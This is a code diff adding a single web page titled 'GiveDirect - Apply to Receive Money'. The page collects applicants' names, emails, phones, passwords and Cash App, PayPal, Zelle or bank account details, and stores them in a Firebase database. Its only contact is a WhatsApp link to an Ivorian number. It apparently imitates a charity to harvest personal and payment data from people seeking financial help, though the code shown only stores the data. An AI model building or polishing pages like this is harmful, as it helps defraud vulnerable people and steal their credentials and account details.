@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GiveDirect - Apply to Receive Money</title>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body, html {
+      height: 100%;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://i.ibb.co/FkHf7Rkr/pngtree-eagle-with-usa-flag-logo-png-image-15738685.png') center center / cover no-repeat;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(4px);
+      z-index: 1;
+    }
+
+    .card {
+      position: relative;
+      z-index: 2;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 40px 30px;
+      width: 350px;
+      color: white;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(0,0,0,0.3);
+    }
+
+    h2 { margin-bottom: 15px; color: #fff; font-weight: 700; }
+    p { font-size: 14px; opacity: 0.9; margin-bottom: 20px; }
+    input, select { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 10px; outline: none; font-size: 14px; }
+
+    .amount-wrapper { position: relative; width: 100%; }
+    .amount-wrapper span { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #0d6d4f; font-weight: bold; }
+    .amount-wrapper input { padding-left: 28px; }
+
+    .password-wrapper { position: relative; width: 100%; }
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 14px;
+      user-select: none;
+      color: #ffd700;
+    }
+
+    .btn { width: 100%; padding: 12px; margin-top: 12px; border: none; border-radius: 30px; cursor: pointer; font-size: 16px; background-color: #0d6d4f; color: white; font-weight: bold; transition: all 0.3s ease; }
+    .btn:hover { background-color: #0a5a40; transform: scale(1.05); }
+
+    .small-text { margin-top: 15px; font-size: 14px; opacity: 0.85; }
+    .small-text a { color: #ffd700; text-decoration: none; }
+
+    #accountDetails { display: none; animation: fadeIn 0.3s ease-in-out; }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+
+  <div class="card">
+    <h2>Apply to Receive Money</h2>
+    <p>Fill in your details below to apply for financial assistance.</p>
+
+    <input type="text" id="fullName" placeholder="Full Name" required />
+    <input type="email" id="email" placeholder="Email Address" required />
+    <input type="tel" id="phone" placeholder="Phone Number" required />
+
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="Password" required />
+      <span class="toggle-password" id="togglePassword">Show</span>
+    </div>
+
+    <select id="accountType" required>
+      <option value="">Select Account Type</option>
+      <option value="CashApp">Cash App</option>
+      <option value="PayPal">PayPal</option>
+      <option value="Wise">Wise</option>
+      <option value="Zelle">Zelle</option>
+      <option value="Bank Transfer">Bank Transfer</option>
+    </select>
+
+    <div class="amount-wrapper">
+      <span>$</span>
+      <input type="number" id="amountNeeded" placeholder="Enter Amount Needed" required />
+    </div>
+
+    <input type="text" id="accountDetails" placeholder="Enter your account details" />
+
+    <button class="btn" id="applyBtn">Submit Application</button>
+
+    <div class="small-text">
+      Need help? <a href="https://wa.me/2250100835285" target="_blank">Contact Us on WhatsApp</a><br>
+      Already have an account? <a href="login.html">Login</a>
+    </div>
+  </div>
+
+  <script>
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDGcWq1jffR3oPH8kmBce9f9ejxuGcNkUk",
+      authDomain: "earnad-1bd6b.firebaseapp.com",
+      projectId: "earnad-1bd6b",
+      storageBucket: "earnad-1bd6b.appspot.com",
+      messagingSenderId: "1025385905773",
+      appId: "1:1025385905773:web:794c70e0ed7bb36da00964",
+      measurementId: "G-3R1NHDHJR7"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+
+    // Password toggle with Show / Hide
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        togglePassword.textContent = 'Hide';
+      } else {
+        passwordInput.type = 'password';
+        togglePassword.textContent = 'Show';
+      }
+    });
+
+    // Show account details dynamically
+    const accountTypeSelect = document.getElementById('accountType');
+    const accountDetailsInput = document.getElementById('accountDetails');
+    accountTypeSelect.addEventListener('change', () => {
+      if (accountTypeSelect.value !== '') {
+        accountDetailsInput.style.display = 'block';
+        accountDetailsInput.placeholder = `Enter your ${accountTypeSelect.value} details`;
+      } else {
+        accountDetailsInput.style.display = 'none';
+      }
+    });
+
+    // Form submission
+    document.getElementById('applyBtn').addEventListener('click', async () => {
+      const fullName = document.getElementById('fullName').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value;
+      const accountType = accountTypeSelect.value;
+      const accountDetails = accountDetailsInput.value.trim();
+      const amountNeeded = document.getElementById('amountNeeded').value;
+
+      // Validation
+      if (!fullName || !email || !phone || !password || !accountType || !amountNeeded) {
+        alert('Please fill in all required fields.');
+        return;
+      }
+
+      if (accountType && !accountDetails) {
+        alert(`Please enter your ${accountType} details.`);
+        return;
+      }
+
+      if (password.length < 6) {
+        alert('Password must be at least 6 characters.');
+        return;
+      }
+
+      const emailPattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+      if (!email.match(emailPattern)) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+
+      // Accept any phone number
+      if (phone.length < 1) {
+        alert('Please enter a valid phone number.');
+        return;
+      }
+
+      try {
+        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+        await db.collection('applications').doc(userCredential.user.uid).set({
+          fullName,
+          email,
+          phone,
+          accountType,
+          accountDetails,
+          amountNeeded,
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        alert('Application submitted successfully!');
+        window.location.href = 'login.html';
+      } catch (error) {
+        alert('Error: ' + error.message);
+      }
+    });
+  </script>
+</body>
+</html>
